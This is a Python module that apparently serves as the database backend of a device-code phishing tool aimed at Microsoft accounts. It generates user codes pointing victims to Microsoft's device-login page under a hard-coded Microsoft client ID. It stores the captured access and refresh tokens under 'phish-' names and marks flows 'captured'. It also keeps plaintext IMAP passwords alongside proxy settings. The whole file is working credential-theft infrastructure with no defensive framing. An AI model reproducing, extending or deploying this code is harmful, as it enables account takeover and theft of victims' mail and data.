import sqlite3, json, threading, time, secrets
from pathlib import Path
from datetime import datetime, timezone

DB = Path(__file__).parent.parent.parent / "tokens.db"
_lock = threading.Lock()

def _conn():
    c = sqlite3.connect(DB)
    c.row_factory = sqlite3.Row
    return c

def init():
    with _lock, _conn() as c:
        c.execute('''CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE NOT NULL,
            access_token TEXT, refresh_token TEXT, id_token TEXT,
            token_type TEXT, expires_at INTEGER, scope TEXT,
            client_id TEXT, tenant_id TEXT, account TEXT,
            account_type TEXT, raw_response TEXT,
            created_at TEXT NOT NULL, updated_at TEXT NOT NULL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS mailbox_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE NOT NULL, email TEXT NOT NULL,
            imap_host TEXT NOT NULL, imap_port INTEGER DEFAULT 993,
            password TEXT NOT NULL, use_ssl INTEGER DEFAULT 1,
            proxy_host TEXT, proxy_port INTEGER,
            created_at TEXT NOT NULL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS oauth_flows (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_code TEXT UNIQUE, user_code TEXT,
            verification_url TEXT, client_id TEXT, scope TEXT,
            interval INTEGER DEFAULT 5, expires_at INTEGER,
            captured_token_name TEXT, status TEXT DEFAULT 'pending',
            created_at TEXT NOT NULL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS device_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_email TEXT, client_id TEXT, scope TEXT,
            device_code TEXT UNIQUE, user_code TEXT,
            verification_uri TEXT, expires_in INTEGER,
            interval INTEGER, status TEXT DEFAULT 'pending',
            captured_token_id INTEGER, created_at TEXT NOT NULL)''')

def _now(): return datetime.now(timezone.utc).isoformat()

def save_token(name, data):
    if isinstance(data, dict): data = json.dumps(data)
    p = json.loads(data)
    with _lock, _conn() as c:
        c.execute('''INSERT INTO tokens (name, access_token, refresh_token, id_token,
            token_type, expires_at, scope, client_id, tenant_id, account,
            account_type, raw_response, created_at, updated_at)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)
            ON CONFLICT(name) DO UPDATE SET
            access_token=excluded.access_token,
            refresh_token=excluded.refresh_token,
            id_token=excluded.id_token,
            updated_at=excluded.updated_at''',
            (name, p.get('access_token'), p.get('refresh_token'), p.get('id_token'),
             p.get('token_type'), p.get('expires_on') or p.get('expires_at') or p.get('expires_in'),
             p.get('scope'), p.get('client_id'), p.get('tid') or p.get('tenant_id'),
             p.get('account') or p.get('username') or p.get('upn'),
             p.get('account_type'), data, _now(), _now()))
    return {"ok": True, "name": name}

def list_tokens():
    with _lock, _conn() as c:
        rows = c.execute('SELECT id, name, account, account_type, scope, expires_at, client_id, tenant_id, created_at FROM tokens ORDER BY id DESC').fetchall()
    return [dict(r) for r in rows]

def get_token(name):
    with _lock, _conn() as c:
        r = c.execute('SELECT * FROM tokens WHERE name=?', (name,)).fetchone()
    return dict(r) if r else None

def delete_token(name):
    with _lock, _conn() as c: c.execute('DELETE FROM tokens WHERE name=?', (name,))
    return {"ok": True}

def save_mailbox_session(name, email, host, port, password, use_ssl=1, proxy_host=None, proxy_port=None):
    with _lock, _conn() as c:
        c.execute('''INSERT INTO mailbox_sessions (name, email, imap_host, imap_port,
            password, use_ssl, proxy_host, proxy_port, created_at)
            VALUES (?,?,?,?,?,?,?,?,?)
            ON CONFLICT(name) DO UPDATE SET email=excluded.email,
            imap_host=excluded.imap_host, imap_port=excluded.imap_port,
            password=excluded.password, use_ssl=excluded.use_ssl''',
            (name, email, host, port, password, use_ssl, proxy_host, proxy_port, _now()))
    return {"ok": True}

def list_mailbox_sessions():
    with _lock, _conn() as c:
        r = c.execute('SELECT id, name, email, imap_host, imap_port, use_ssl FROM mailbox_sessions ORDER BY id DESC').fetchall()
    return [dict(r) for r in r]

def get_mailbox_session(name):
    with _lock, _conn() as c:
        r = c.execute('SELECT * FROM mailbox_sessions WHERE name=?', (name,)).fetchone()
    return dict(r) if r else None

def delete_mailbox_session(name):
    with _lock, _conn() as c: c.execute('DELETE FROM mailbox_sessions WHERE name=?', (name,))
    return {"ok": True}

def start_device_capture(session_email, client_id='d3590ed6-52b3-4102-aeff-aad2292ab01c',
                         scope='https://graph.microsoft.com/.default'):
    device_code = secrets.token_urlsafe(24)
    user_code = ''.join(secrets.choice('BCDFGHJKLMNPQRSTVWXZ23456789') for _ in range(9))
    with _lock, _conn() as c:
        c.execute('''INSERT INTO device_codes (session_email, client_id, scope,
            device_code, user_code, verification_uri, expires_in, interval, status, created_at)
            VALUES (?,?,?,?,?,?,?,?,?,?)''',
            (session_email, client_id, scope, device_code, user_code,
             'https://microsoft.com/devicelogin', 900, 5, 'pending', _now()))
    return {
        "device_code": device_code, "user_code": user_code,
        "verification_uri": "https://microsoft.com/devicelogin",
        "expires_in": 900, "interval": 5,
        "client_id": client_id, "scope": scope, "session_email": session_email,
    }

def get_device_code(device_code):
    with _lock, _conn() as c:
        r = c.execute('SELECT * FROM device_codes WHERE device_code=?', (device_code,)).fetchone()
    return dict(r) if r else None

def complete_device_code(device_code, access_token, refresh_token=None, id_token=None,
                         scope=None, account=None, expires_in=3600, client_id=None):
    t = {
        "access_token": access_token, "refresh_token": refresh_token,
        "id_token": id_token, "scope": scope,
        "client_id": client_id, "account": account,
        "expires_in": expires_in, "expires_on": int(time.time()) + expires_in,
        "account_type": "Microsoft",
    }
    name = f"phish-{account.replace('@','_') if account else secrets.token_hex(4)}"
    save_token(name, t)
    with _lock, _conn() as c:
        c.execute('UPDATE device_codes SET status=?, captured_token_id=(SELECT id FROM tokens WHERE name=?) WHERE device_code=?',
                  ('captured', name, device_code))
    return name

def list_device_codes():
    with _lock, _conn() as c:
        r = c.execute('SELECT id, session_email, user_code, status, created_at FROM device_codes ORDER BY id DESC').fetchall()
    return [dict(x) for x in r]